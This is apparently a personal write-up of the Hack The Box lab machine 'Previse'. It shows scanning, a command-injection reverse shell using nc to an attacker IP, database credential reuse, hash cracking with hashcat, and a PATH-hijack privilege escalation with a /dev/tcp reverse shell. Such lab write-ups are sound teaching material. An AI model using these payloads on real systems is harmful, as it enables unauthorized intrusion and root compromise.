---
title: "HTB: Previse"
last_modified_at: 2022-01-01T20:00:00+01:00
categories:
  - HTB
tags:
  - Easy-Box
  - Linux
header.image: "/assets/htb/previse/previse_box_info.png"
---

# Quick summary
Today the box `Previse` retired on HTB and this is my write-up.
This was my first real attempt at a write-up and I have a lot to learn.

![Previse Box Info](/assets/htb/previse/previse_box_info.png)


# Enumeration

The first thing to run is a portscan of the target.
The tool used is called `Rustscan`.

## Rustscan

```bash
rustscan -a 10.129.252.209 -- -A -oA nmap/initial
```

Rustscan pipes the ports over to `Nmap`.

### Nmap

```
# Nmap 7.92 scan initiated Mon Nov  8 13:00:38 2021 as: nmap -vvv -p 22,80 -A -oA nmap/initial 10.129.252.209
Nmap scan report for 10.129.252.209
Host is up, received syn-ack (0.036s latency).
Scanned at 2021-11-08 13:00:39 CET for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  8 13:00:47 2021 -- 1 IP address (1 host up) scanned in 9.31 seconds
```

Only two ports open, `22 ssh` and `80 http`.

## HTTP (80)

Visiting the website:
![Visiting the website](/assets/htb/previse/visiting_website.png)

Trying `admin:admin` and other default credentials didn't work.

### Feroxbuster

It's always to good to have something running in the background while poking at the website.

```bash
# feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o ferox.out -C 403 -u http://10.129.252.209

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.252.209
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💾  Output File           │ ferox.out
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      313c http://10.129.252.209/js
301        9l       28w      314c http://10.129.252.209/css
200       53l      138w     2224c http://10.129.252.209/login.php
302       71l      164w     2801c http://10.129.252.209/index.php
302        0l        0w        0c http://10.129.252.209/download.php
302        0l        0w        0c http://10.129.252.209/logout.php
200        0l        0w        0c http://10.129.252.209/config.php
200       17l       70w     1157c http://10.129.252.209/js/
200       20l       64w      980c http://10.129.252.209/header.php
200        5l       14w      217c http://10.129.252.209/footer.php
200       16l       58w      941c http://10.129.252.209/css/
302       71l      164w     2801c http://10.129.252.209/
302       93l      238w     3994c http://10.129.252.209/accounts.php
200       31l       60w     1248c http://10.129.252.209/nav.php
302       74l      176w     2966c http://10.129.252.209/status.php
302      112l      263w     4914c http://10.129.252.209/files.php
302        0l        0w        0c http://10.129.252.209/logs.php
[####################] - 2m    430030/430030  0s      found:17      errors:19     
[####################] - 2m     86006/86006   697/s   http://10.129.252.209
[####################] - 2m     86006/86006   697/s   http://10.129.252.209/js
[####################] - 2m     86006/86006   715/s   http://10.129.252.209/css
[####################] - 2m     86006/86006   709/s   http://10.129.252.209/js/
[####################] - 2m     86006/86006   700/s   http://10.129.252.209/css/
```
Some interesting pages with status code `200`.<br><br>
Visiting the pages gets redirected to `/login.php`, except `/nav.php`:<br>
![nav.php page](/assets/htb/previse/nav_php.png)<br><br>

Intercepting both the request and response with `Burp Suite` gives a interesting response:
![Burp response when visiting nav.php page](/assets/htb/previse/burp_response_nav_php.png)

Should be able to send a request in `Burp Suite` with the parameters from the response.

# Exploit - Creating user

Sending the following request using `Burp Suite`.

```http
POST /accounts.php HTTP/1.1
Host: 10.129.252.209
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.129.252.209/nav.php
Cookie: PHPSESSID=slg79ck6krdd0v61uovmtpj3ge
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

username=eplots&password=password1&confirm=password1
```

Confirmation that the user has been created.
![User created](/assets/htb/previse/user_created.png)

Logged in with the created user.
![Logged in](/assets/htb/previse/logged_in.png)

## Further enumerating website

`accounts.php`:<br>
The page to create new users.
Nothing interesting.

`files.php`:<br>
A fileupload page with a already uploaded `sitebackup.zip`
![Fileupload page](/assets/htb/previse/file_upload.png)<br>

`status.php`:<br>
Shows that MySQL is online and there's 2 registered admins.
![Status page](/assets/htb/previse/status_page.png)

`file_logs.php`:<br>
Can sort by three file delimeters.
* comma
* space
* tab

Starting with `file_logs.php` we download a file called `out.log`:
```s
# cat out.log 
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
```

We got a username of `m4lwhere`.

## siteBackup.zip
Downloading the `siteBackup.zip` gives us the source-code of the site.
Checking the file `config.php` reveals a username and password for the database `previse`:<br>
`root`:`mySQL_p@ssw0rd!:)`

Since the portscan didn't reveal a SQL server listening, we can't connect remotely.

The password didn't work with SSH, not for `root` or `m4lwhere`.

Looking at the file `logs.php`, shows a comment from the developer that it uses `python` and not `php` as expected.<br>
The file also reveals that the dangerous `exec` function is called:
![Comment about python](/assets/htb/previse/comment_python.png)

Looking at the `file_logs.php` page in `Burp Suite` the request is a `POST` with a parameter called `delim=comma`.

# Shell as www-data

Using `Burp Suite` and a payload in the parameter `delim=comma`.

Payload:
`delim=comma nc-e /bin/sh 10.10.14.62 1886`.
URL encode the payload to:
`delim=comma%26nc+-e+/bin/sh+10.10.14.62+1886`

Setting up a `ncat` listener:
`ncat -lvnp 1886`

![Shell as www-data](/assets/htb/previse/shell_wwwdata.png)

Starting with upgrading the shell:<br>
`python -c "import pty;pty.spawn('/bin/bash')"`<br>
`export TERM=xterm`

## MySQL
Logging in to the database using credentials found earlier.<br>
`root`:`mySQL_p@ssw0rd!:)`

Found a password hash in the table `accounts`:<br>
![MySQL Hashes](/assets/htb/previse/mysql_hashes.png)
(The wierd symbol in BlackArch is a saltshaker.)<br>
`$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`

### Hashcat

Using hashcat on Windows host machine and not inside the BlackArch VM:<br>
`hashcat.exe -m 500 -o cracked.txt hash.txt`

Cracked!<br>
`$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!`

# SSH as m4lwhere

Trying to SSH into the box with the user m4lwhere and the newly cracked password.<br>
![SSH as m4lwhere](/assets/htb/previse/shell_m4lwhere.png)

Found the `user.txt` and able to view it.

## Privilage Escalation

Running `sudo -l` reveals that the user can run a bash script as root:<br>
![Bash script as root](/assets/htb/previse/bash_as_root.png)

The file `/opt/scripts/access_backup.sh` uses a relative path and not the full path.<br>
This makes it vulnerable to "path injection".

### Path Injection
1. Create a file named gzip in `/tmp` containing a reverse bash shell, with permissions of 777.<br>
`cd /tmp`<br>
`echo "bash -i >& /dev/tcp/10.10.14.62/1886 0>&1" > gzip`<br>
`chmod 777 gzip`<br>
3. Configure the environment variable \$PATH to the current directory.<br>
`export PATH=/tmp:$PATH`
4. Start a netcat listner on attacker machine.<br>
`ncat -lvnp 1886`
5. Execute `/opt/scripts/access_backup.sh` as sudo.<br>
`sudo /opt/scripts/access_backup.sh`

![Shell as root](/assets/htb/previse/shell_root.png)

# Pwned confirmation
![Previse Pwned](/assets/htb/previse/previse_pwned.png)